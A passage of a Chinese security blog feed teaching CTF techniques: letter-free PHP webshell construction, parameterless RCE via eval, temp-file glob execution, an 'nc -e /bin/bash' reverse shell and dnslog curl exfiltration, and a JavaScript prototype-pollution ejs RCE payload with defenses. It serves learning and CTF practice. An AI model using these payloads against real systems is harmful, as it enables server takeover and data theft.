</code></pre><p>利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如<code>'和'{2}</code>的结果是<code>"\x8c"</code>，其取反即为字母<code>s</code></p><h3 id="3-自增"><a href="#3-自增" class="headerlink" title="3.自增"></a>3.自增</h3><p>只要我们获得了小写字母<code>a</code>，就可以通过自增获得所有小写字母，当我们获得大写字母<code>A</code>，就可以获得所有大写字母了</p><p>数组(Array)中就正好有大写字母<code>A</code>和小写字母<code>a</code>，而在PHP中，如果强制连接数组和字符串的话，数组就会被强制转换成字符串，它的值就为<code>Array</code>，那取它的第一个子母，就拿到<code>A</code>了，那有了<code>a</code>和<code>A</code>，相当于我们就可以拿到<code>a-z</code>和<code>A-Z</code>中的所有字母了</p><pre class="language-none"><code class="language-none">&lt;?php$_=[];$_=@"$_"; // $_='Array';$_=$_['!'=='@']; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;$___($_[_]); // ASSERT($_POST[_]);</code></pre><p>在php7中，我们可以使用($a)()这种方法来执行命令，如(call_user_func)(system,whoami,’’)</p><p>php7特性</p><pre class="language-none"><code class="language-none">&lt;?php'var_dump'('1111'); ("VAR_DUMP")("llll"); echo $_GET[ss];echo $_GET['1'] . '&lt;br/&gt;';echo $_GET[1];$a = '_GET';echo $$a[1];echo `pwd`;</code></pre><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=NThjZjVhNjA3NWI1NmY1MjI1NzI2ZDcwZTE2NGQ4YTlfdnEydWQ0VDBWMFU4Z2dLMW1XVGhEUHhKZkQwV1M2VkNfVG9rZW46WmZiemJLdWZYb3lZZEp4cEVKbmNzZVhJbmViXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><h3 id="4-临时文件"><a href="#4-临时文件" class="headerlink" title="4.临时文件"></a>4.<strong>临时文件</strong></h3><p>利用通配符</p><p>用<code>. file</code>执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，</p><p>这个文件也很好得到，我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是<code>/tmp/phpXXXXXX</code>，文件名最后6个字符是随机的大小写字母。</p><p>所有文件名都是小写，只有PHP生成的临时文件包含大写字母。那么答案就呼之欲出了，我们只要找到一个可以表示“大写字母”的glob通配符，就能精准找到我们要执行的文件。</p><p>翻开ascii码表，可见大写字母位于<code>@</code>与<code>[</code>之间：</p><p>当然，php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。</p><p>最后，我传入的code为<code>?&gt;&lt;?=. /???/????????[@-[];?&gt;</code>，发送数据包如下：</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YWU5MjU2NWQ2MWJmYjU3Zjk5MGY3MTY2Y2Q4YmZiYzZfUENkN3pEbm5MMzU2b0hQWk9NVDhENnlHVlo0R3J3alRfVG9rZW46RUYzd2JmRWt6b2JkRXl4NkFlRGNVQ0tpbmxiXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>成功执行任意命令。</p><h2 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h2><p>无参rce，就是说在无法传入参数的情况下，仅仅依靠传入没有参数的函数套娃就可以达到命令执行的效果，这在ctf中也算是一个比较常见的考点，接下来就来详细总结总结它的利用姿势</p><h2 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h2><pre class="language-none"><code class="language-none">if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {  eval($_GET['code']);}</code></pre><p>这段代码的核心就是只允许函数而不允许函数中的参数，就是说传进去的值是一个字符串接一个<code>()</code>，那么这个字符串就会被替换为空，如果替换后只剩下<code>;</code>，那么这段代码就会被<code>eval</code>执行。而且因为这个正则表达式是递归调用的，所以说像<code>a(b(c()));</code>第一次匹配后就还剩下<code>a(b());</code>，第二次匹配后就还剩<code>a();</code>，第三次匹配后就还剩<code>;</code>了，所以说这一串<code>a(b(c()));</code>就会被<code>eval</code>执行，但相反，像<code>a(b('111'));</code>这种存在参数的就不行，因为无论正则匹配多少次它的参数总是存在的。那假如遇到这种情况，我们就只能使用没有参数的php函数，下面就来具体介绍一下：</p><h2 id="1-getallheaders"><a href="#1-getallheaders" class="headerlink" title="1.getallheaders()"></a>1.getallheaders()</h2><p>这个函数的作用是获取<code>http</code>所有的头部信息，也就是<code>headers</code>，然后我们可以用<code>var_dump</code>把它打印出来，但这个有个限制条件就是必须在<code>apache</code>的环境下可以使用，其它环境都是用不了的，我们到burp中去做演示,测试代码如下：</p><pre class="language-none"><code class="language-none">&lt;?phphighlight_file(__FILE__);if(isset($_GET['code'])){if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {  eval($_GET['code']);}else die('nonono');}else echo('please input code');?&gt; </code></pre><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=M2Y2OTE1NzVjMzBkZGZiZGY1MzZmODY0ODk4OWNjMWFfOXQ1SnRDZ1NqTVJSaWZvOEJMZDNDYmxJSlV0SFlHNTFfVG9rZW46QkpCYmJReDR4bzZVMUd4ZDBtTmNFTEMxbkZnXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>可以看到，所有的头部信息都已经作为了一个<strong>数组</strong>打印了出来，在实际的运用中，我们肯定不需要这么多条，不然它到底执行哪一条呢？所以我们需要选择一条出来然后就执行它，这里就需要用到<code>php</code>中操纵数组的函数了，这里常见的是利用<code>end()</code>函数取出最后一位，这里的效果如下图所示，而且它只会以<strong>字符串</strong>的形式取出<strong>值</strong>而不会取出键，所以说键名随便取就行：</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YjcwZmViOTQ5NjZlYzZkZDdlMjMyNjIyOGQ2M2VjODhfNmFYY2VGZU1oRXFNZXVYMXh2dVRxWGlWQXVybTR1dGxfVG9rZW46VkJOQ2I1UmVPb0o1QU54cE9xV2NUcjB5bjFiXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>那我们把最前面的<code>var_dump</code>改成<code>eval</code>，不就可以执行<code>phpinfo</code>了吗，换言之，就可以实现任意php代码的代码执行了，那在没有过滤的情况下执行命令也就轻而易举了，具体效果如下图所示：</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=MmY0Yzk0MjA1MWU0MDlhNWMyODAwMTBkZDIyMzEyZTZfTHU0emMxbVBkQXJjMGo4WVhGWVoxOVQ0MDRMZmpKbVpfVG9rZW46RnBjTGJhYkM5bzZkU2p4NndQcWNOOHpmbmFnXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ODYyMDRkNmUzOWFjYjMzYzdkOTlmNDJiNWZmZGI1MmNfcjdPTTJNaGRQUnMzQVk5dGF5QlVpN2ZHM1lYN2NlcjJfVG9rZW46RE1XRGJ6N1lFb3Bycnd4OUJtQmNpSFhybmtZXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><h2 id="2-get-defined-vars"><a href="#2-get-defined-vars" class="headerlink" title="2.get_defined_vars()"></a>2.get_defined_vars()</h2><p>上面说到了，<code>getallheaders()</code>是有局限性的，因为如果中间件不是<code>apache</code>的话，它就用不了了，那我们就介绍一种更为普遍的方法<code>get_defined_vars()</code>，这种方法其实和上面那种方法原理是差不多的：</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YTcyMjlhMDI4YmE1Y2FjNGJhZjlmODNmZTNiZGJhZmZfaFhtY2FKVGx6TzBqVldjc3JMMzFpN3dYdkRsUWhrYW1fVG9rZW46T2ViS2JJVTUyb2l6THl4Vk81WGNpVkFBbnhmXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>可以看到，它并不是获取的<code>headers</code>，而是获取的四个全局变量<code>$_GET $_POST $_FILES $_COOKIE</code>，而它的返回值是一个二维数组，我们利用<code>GET</code>方式传入的参数在第一个数组中。这里我们就需要先将二维数组转换为一维数组，这里我们用到<code>current()</code>函数，这个函数的作用是返回数组中的当前单元，而它的默认是第一个单元，也就是我们GET方式传入的参数，我们可以看看实际效果：</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDE3NmU2OTdkM2Y4ODVlMDYwZDFlOTk0YTc3NmRmNzlfUEJkRDBXM1VEdWxpNnhyaHVPMnlZN01xQVlad2ZZVTFfVG9rZW46SldnZ2JWcm1Qb0YzYjl4d3ZHMWNQSlZWbjNlXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>这里可以看到成功输出了我们二维数组中的第一个数据，也就是将GET的数据全部输出了出来，相当于它就已经变成了一个一维数组了，那按照我们上面的方法，我们就可以利用<code>end()</code>函数以字符串的形式取出最后的值，然后直接<code>eval</code>执行就行了，这里和上面就是一样的了：</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=NTE2NmNjMmNkMDJmODQ5ODZmN2RmYzQyMzczYzFlMDJfM0xMWHg3OE5xVnVLVmVzc0hNOTNTRlB0WWh4R1UyUDVfVG9rZW46SU11QWJUNnNKbzNiMGV4c1djMWN5bGdUbmJkXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YmM0Yzc3YWEzYTJlOTZlYjE0ZDAwMmFiMTk5ZjFjMjVfNk5pVnRYRzlpTjFvQWFJVG1vY3l2TUxKY0UyQ1hMdUdfVG9rZW46QnhKdWJQM3pxbzZpYWZ4amxSRWNpOEMwbk9oXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=N2Q3MWE2ZDBhYWQ0YTY1NGY2OWIyMGFiYWM5Nzk5MTZfaFFMRmw1NGZBVVNoVzBqcFk3ZkREVXdzWHY1TFQ1dnFfVG9rZW46VTNUTmJtMm1wb1FlVjF4dGw0cWNQNWx3bndoXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>总结一下，这种方法和第一种方法几乎是一样的，就多了一步，就是利用<code>current()</code>函数将二维数组转换为一维数组，如果大家还是不了解<code>current()</code>函数的用法，可以接着往下看文章，会具体介绍的哦</p><p>这里还有一个专门针对<code>$_FILES</code>下手的方法，可以参考这篇文章：<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></p><h2 id="3-session-id"><a href="#3-session-id" class="headerlink" title="3.session_id()"></a>3.session_id()</h2><p>这种方法和前面的也差不太多，这种方法简单来说就是把恶意代码写到<code>COOKIE</code>的<code>PHPSESSID</code>中，然后利用<code>session_id()</code>这个函数去读取它，返回一个字符串，然后我们就可以用<code>eval</code>去直接执行了，这里有一点要注意的就是<code>session_id()</code>要开启<code>session</code>才能用，所以说要先<code>session_start()</code>，这里我们先试着把<code>PHPSESSID</code>的值取出来：</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjZhNmMwNTczNTBjYzg1MzYwZmJiMWE4MjJiZWNjNjVfY3dMU2RKR241cFhIZnJpTFZ1YTBQdWdCTmNRcnFVZVdfVG9rZW46UzV5aWJHekdzb21GYkx4RW1qc2MybTBDbkN1XzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>直接出来就是字符串，那就非常完美，我们就不用去做任何的转换了，但这里要注意的是，<code>PHPSESSIID</code>中只能有<code>A-Z a-z 0-9</code>，<code>-</code>，所以说我们要先将恶意代码16进制编码以后再插入进去，而在php中，将16进制转换为字符串的函数为<code>hex2bin</code></p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDUxM2YxNjdiNTc4YjM2MTc3OWUxMDY2YjMxYmQ5NWZfUU1jdjRlVzRlVktzNnFuVmNEYktiOHRkTk1tRGp0Yk9fVG9rZW46Tmw3Z2JwaFVGb2FCYjZ4NHFwcGNJcjV6bmIwXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjVkZmE4MmRmMWM2MTI0NWFjZTU5ZjMyODdkZjljNTVfUkFGQmZJZTJWaDJZNW1JbksyWHpybzNnYlF0WEpnNVRfVG9rZW46SWdQbmJOTzZrbzcyZXB4dlJVU2NKM2d6bm5nXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>那我们就可以开始构造了，首先把<code>PHPSESSID</code>的值替换成这个，然后在前面把<code>var_dump</code>换成<code>eval</code>就可以成功执行了，如图：</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YzE1NDM3ZGZiNDRkYThjZGQ3MzBmNTNiMGFiOTJhMTJfc2FuaTliR0hhNG1YY3dIQ1plTDE4cU5mcWdZZGswSWdfVG9rZW46SHJEQWJWYWdPbzNRclB4dXhBQmNSb2h2bnRmXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>成功出现<code>phpinfo</code>，稳稳当当，这种方法我认为是最好的一种方法，很容易理解，只是记得要将恶意代码先16进制编码一下哦</p><h2 id="4-php函数直接读取文件"><a href="#4-php函数直接读取文件" class="headerlink" title="4.php函数直接读取文件"></a>4.php函数直接读取文件</h2><p>上面我们一直在想办法在进行rce，但有的情况下确实无法进行rce时，我们就要想办法直接利用php函数完成对目录以及文件的操作， 接下来我们就来介绍这些函数：</p><h3 id="1-localeconv"><a href="#1-localeconv" class="headerlink" title="1.localeconv"></a>1.localeconv</h3><p>官方解释：localeconv() 函数返回一个包含本地数字及货币格式信息的数组。</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YmU2NDExYzg1OWQ4NTBlYzcyMGVmOGQzYmVmMmMwOTlfbkNuVEc4RFRhdGViTHAyV3lGMWtQV04zOWlVTkFidWpfVG9rZW46WlA2eGJET2VlbzR3RzB4T3NTNWNQcWIzbnZiXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>这个函数其实之前我一直搞不懂它是干什么的，为什么在这里有用，但实践出真知，我们在测试代码中将<code>localeconv()</code>的返回结果输出出来，这里很神奇的事就发生了，它返回的是一个二维数组，而它的第一位居然是一个点<code>.</code>，那按照我们上面讲的，是可以利用<code>current()</code>函数将这个点取出来的，但这个点有什么用呢？点代表的是当前目录！那就很好理解了，我们可以利用这个点完成遍历目录的操作！相当于就是<code>linux</code>中的<code>ls</code>，具体请看下图：</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YzBjNWFiZTUxOWRjNTc1ZmY4MWQ0ZjE5NjdkN2NmY2VfZGlrQzFkVFZ2Ykw3Y0FxWUxLS0VNTmNNbHQyTEVDVzdfVG9rZW46Ulg5NWJsaHFvb1hLOWF4bXQ1WWNGZE5BblFlXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=MDAzMjYwNTQ3OWUyOWRjNzRlZjUyNDc4YThkZGM4NmRfMnd3UFZESXczWVBVT05FbW9RYmxKcFAyUDdBSkRJaGNfVG9rZW46QUtYUmJnRVNNb09VSm14SGI3cGNjYjBJblFmXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=OTc0NjY0MzQzYzc3MWY5NmM0YzA1MWI0NWM0MjdkMmJfM2NDekp1RnpVN3p0RWZUd2sxRU5rQlB0NDJ1TFVWM1NfVG9rZW46VHM5eGJid3VGbzdhY1N4aDc5M2NBQmdHblhjXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><h3 id="2-scandir"><a href="#2-scandir" class="headerlink" title="2.scandir"></a>2.scandir</h3><p>这个函数很好理解，就是列出目录中的文件和目录</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=MDFiMzQyMzcwMjUzODhlZTQ2YzE4ODdjZTcyZDQ1NzBfazhHb1paS0pwcWdyekd3YW5CTDByWlUwZFFiaXBsbnZfVG9rZW46WFJLWWJTQ2xjb2ZXeWx4d09CQmNEZlZNblYxXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><h3 id="3-current-pos"><a href="#3-current-pos" class="headerlink" title="3.current(pos)"></a>3.current(pos)</h3><p>这里首先声明，<code>pos()</code>函数是<code>current()</code>函数的别名，他们俩是完全一样的哈</p><p>这个函数我们前面已经用的很多了，它的作用就是输出数组中当前元素的值，只输出值而忽略掉键，默认是数组中的第一个值，如果要移动可以用下列方法进行移动：</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTI1NjQxZjkzM2U2MWYzZGYyMTdlNWY3MGQ3MjQzYzFfV2lUS1VPVVkzZzl0OUlLN2I2YlFQaUlxVklkOW80WmRfVG9rZW46UUh6bGIyUUdGb0Z4TnF4QVduMWMwZVh0blZnXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><h3 id="4-chdir"><a href="#4-chdir" class="headerlink" title="4.chdir()"></a>4.chdir()</h3><p>这个函数是用来跳目录的，有时想读的文件不在当前目录下就用这个来切换，因为<code>scandir()</code>会将这个目录下的文件和目录都列出来，那么利用操作数组的函数将内部指针移到我们想要的目录上然后直接用<code>chdir</code>切就好了，如果要向上跳就要构造<code>chdir('..')</code></p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=MWVkOWYzMWM5ZDE0NzBhYzRhYjdmZDM3OWE5MDM3ZTRfcVJ5R0t2RUtoZ3Z6Q2dJZzRYSWdjU0czb2RsVUFJdU9fVG9rZW46VVhmN2JJUHpmb0lJc3F4WEV0NWNSSUh2bkZnXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><h3 id="5-array-reverse"><a href="#5-array-reverse" class="headerlink" title="5.array_reverse()"></a>5.array_reverse()</h3><p>将整个数组倒过来，有的时候当我们想读的文件比较靠后时，就可以用这个函数把它倒过来，就可以少用几个<code>next()</code></p><h3 id="6-highlight-file"><a href="#6-highlight-file" class="headerlink" title="6.highlight_file()"></a>6.highlight_file()</h3><p>打印输出或者返回 filename 文件中语法高亮版本的代码，相当于就是用来读取文件的</p><h2 id="无回显RCE"><a href="#无回显RCE" class="headerlink" title="无回显RCE"></a>无回显RCE</h2><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>条件：具有nc</p><p>命令</p><p> nc -e /bin/bash ip port</p><p>然后再在服务器上开启端口接听</p><h4 id="dnslog"><a href="#dnslog" class="headerlink" title="dnslog"></a>dnslog</h4><p>发起一个dns请求需要通过linux中的<code>ping</code>命令或者<code>curl</code>命令</p><p>然后这里一个dnslog的利用平台：ceye <a href="http://ceye.io/">http://ceye.io/</a></p><p>作为命令的分隔符，然后发起<code>curl</code>请求，然后最后用反引号执行命令</p><h4 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h4><p>特定情况下压缩flag文件,并访问</p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> 基础漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript的原型链污染</title>
      <link href="/2023/07/26/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
      <url>/2023/07/26/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<h1 id="js原型链污染"><a href="#js原型链污染" class="headerlink" title="js原型链污染"></a>js原型链污染</h1><h2 id="基础概念辨析"><a href="#基础概念辨析" class="headerlink" title="基础概念辨析"></a>基础概念辨析</h2><h3 id="原型"><a href="#原型" class="headerlink" title="原型"></a><strong>原型</strong></h3><p>js中一切皆对象,js的每个对象都有一个属性原型（prototype），原型本身也是一个对象，因此该原型也有一个prototype指向上层原型，直到为null，这样就构成了原型链</p><p>简单来说，原型链是javascript中类继承的一种机制，每个对象都有对应的原型，储存了定义的属性和方法，之中包含了prototype，指向上一级的原型。最上层Object原型中的prototype为null</p><p><strong>特性</strong></p><p>类定义中的属性，会在创建对象时在对象中创建，类定义的方法而是存在于原型之中。当使用没有定义的属性和方法时，就会顺着原型链一直寻找，直到为undefined,用此来实现继承，子类能用父类的属性和方法</p><p>示例</p><pre class="language-none"><code class="language-none">function Person(name) {       this.name = name;   }   Person.prototype.greet = function () {       console.log(`Hello, my name is ${this.name}`);   };   const person1 = new Person('Alice');   person1.greet(); // 输出 "Hello, my name is Alice"</code></pre><p><img src="/./js.jpg" alt="img"></p><p>​<em>person1对象原型对象展示</em></p><p><strong>prototype与__proto__</strong></p><p>(1)所有引用类型（函数，数组，对象）都拥有<code>__proto__</code>属性（隐式原型）,用来查看其原型</p><p>(2)所有函数拥有<code>prototype</code>属性（显式原型）（仅限函数）</p><p> 简单来说，<strong>proto</strong> 属性是指向该对象的原型，而 prototype属性是用于创建该对象的构造函数的原型。</p><h3 id="Function-与function"><a href="#Function-与function" class="headerlink" title="Function 与function"></a>Function 与function</h3><p>function是一个定义函数的关键字，Function是代表所有函数的内置原型对象</p><p>每一个js 的function都是Function对象，Function是js内置对象，用以实现很多基本功能，如Nunmber,toString</p><p>constructor是一个对象数据属性属性,创建对象后，访问constructor属性，可以返回构造该对象的来源（不是该对象的原型链上级）</p><h3 id="new"><a href="#new" class="headerlink" title="new"></a>new</h3><p>new constructor[([arguments])]</p><p>参数</p><p><code>constructor</code></p><p>一个指定对象实例的类型的类或函数。</p><p>描述</p><p><code>new</code> 关键字会进行如下的操作：</p><ol><li>创建一个空的简单 JavaScript 对象（即 <code>{}</code>）；</li><li>为步骤 1 新创建的对象添加属性 <code>__proto__</code>，将该属性链接至构造函数的原型对象；</li><li>将步骤 1 新创建的对象作为 <code>this</code> 的上下文；</li><li>如果该函数没有返回对象，则返回 <code>this</code>。</li></ol><h3 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h3><p>当我们添加或者修改上层原型的一些属性，子类都又调用该恶意属性时，子类调用的属性已经被我们篡改，造成原型链污染，原型链污染可能会造成命令执行(rce)或者任意文件读取,越权等等</p><p>示例</p><pre class="language-none"><code class="language-none">function merge(target, source) {      for (let key in source) {          if (key in source &amp;&amp; key in target) {              // 如果target与source有相同的键名 则让target的键值为source的键值              merge(target[key], source[key])          } else {              target[key] = source[key]  // 如果target与source没有相通的键名 则直接在target新建键名并赋给键值          }      }  }  let o1 = {}  let o2 = JSON.parse('{ "a": 1, "__proto__": { "b": 2} }');  merge(o1, o2)  console.log(o1.a, o1.b)  o3 = {}  console.log(o3.b)</code></pre><p>漏洞点</p><p>一般对对象进行复制拷贝,如merge函数或者copy函数，会将传入的json数据拷贝至已创建对象，此时可能会产生原型链污染</p><h4 id="ejs模板基于原型链污染的rce"><a href="#ejs模板基于原型链污染的rce" class="headerlink" title="ejs模板基于原型链污染的rce"></a>ejs模板基于原型链污染的rce</h4><p>直接上POC</p><pre class="language-none"><code class="language-none">a; return global.process.mainModule.constructor._load('child_process').execSync('whoami'); //</code></pre><p>参考学习：<a href="https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/">https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/</a></p><h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><p>对于<code>toUpperCase()</code>函数</p><pre class="language-none"><code class="language-none">字符"ı"、"ſ" 经过toUpperCase处理后结果为 "I"、"S"</code></pre><p>对于<code>toLowerCase</code></p><pre class="language-none"><code class="language-none">字符"K"经过toLowerCase处理后结果为"k"(这个K不是K)</code></pre><p>详情可见p神的文章<a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">https://www.leavesongs.com</a></p><p>python中也存在原型链污染</p><p>可参考文章：<a href="https://tttang.com/archive/1876">https://tttang.com/archive/1876</a></p><p>ctf例题：<a href="https://chenlvtang.top/2021/08/17/NodeJs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E7%9A%84%E5%AE%9E%E8%B7%B5">https://chenlvtang.top/2021/08/17/NodeJs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E7%9A%84%E5%AE%9E%E8%B7%B5</a></p><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>1.Object.freeze()冻结原型</p><pre class="language-none"><code class="language-none">Object.freeze(Object.prototype);Object.freeze(Object)</code></pre><p>冻结原型后，无法添加新的原型至原型链</p><p>2.对JSON输入验证</p><p>npm上有很多库，如avj，可以对JSON数据验证，排除json中数据中不需要的属性</p><p>或者在复制对象时，遍历键名时候，检查__proto__和prototype</p><p>3.使用map代替{}</p><p>4.使用Object.create()安全创建对象</p><p>这样创建的对象没有属性</p><p>5.node.js中可以通过disable-proto直接禁止操作原型链</p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>http概述</title>
      <link href="/2023/07/20/http%E6%A6%82%E8%BF%B0/"/>
      <url>/2023/07/20/http%E6%A6%82%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<hr><ul><li><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>​Web 使用一种名为 HTTP（超文本传输协议 ）的协议作为规范，完成从客户端到服务器端等一系列运作流 程。而协议是指规则的约定。Web 是建立在 HTTP 协议上通 信的。 http协议主要是计算机网络系统上的应   用层。</p></li><li><h4 id="TCP-IP协议族"><a href="#TCP-IP协议族" class="headerlink" title="TCP/IP协议族"></a>TCP/IP协议族</h4><h5 id="主要内容："><a href="#主要内容：" class="headerlink" title="主要内容："></a>主要内容：</h5></li></ul><pre class="language-none"><code class="language-none">应用层：FTP（文件传输协议）和DNS（域名系统）和http协议传输层：TCP（传输控制协议）和UDP（用户数据报协议）网络层：处理在网络上流动的数据包 链路层：处理连接网络的硬件部分 </code></pre><ul><li><h4 id="IP、TCP和DNS："><a href="#IP、TCP和DNS：" class="headerlink" title="IP、TCP和DNS："></a>IP、TCP和DNS：</h4></li></ul><pre class="language-none"><code class="language-none">**IP**IP地址：指明被分配的地址MAC地址：指网卡所属固定的地址运作方式：利用IP指明目标，中转时利用下一站中转设备的MAC地址搜素下一个中转目标。利用ARP协议可以根据IP地址解析出MAC地址。**TCP**TCP提供字节流服务，把数据分割，并通过带SYN/ACK的数据包（三次）确定是否最终传送到对方。**DNS**提供域名和IP之间解析服务</code></pre><ul><li><h4 id="URI和URL"><a href="#URI和URL" class="headerlink" title="URI和URL"></a>URI和URL</h4><p>​URI：是由某个协议方案表示的资源的定位标识符</p><p>​URL:是使用 Web 浏览器等 访问 Web 页面时需要输入的网页地址 </p><p>​URI格式：协议方案名+登录信息（认证）+服务器地址+服务器端口号+带层次的文件路径+查询字符串+片段标识符如：<a href="http://user:pass@www.example.jp/dir/index.htm?uid=1#ch1">http://user:pass@www.example.jp:80/dir/index.htm?uid=1#ch1</a></p><p>​</p></li></ul><p></p><h3 id="简单的http协议"><a href="#简单的http协议" class="headerlink" title="简单的http协议"></a>简单的http协议</h3><hr><p>HTTP 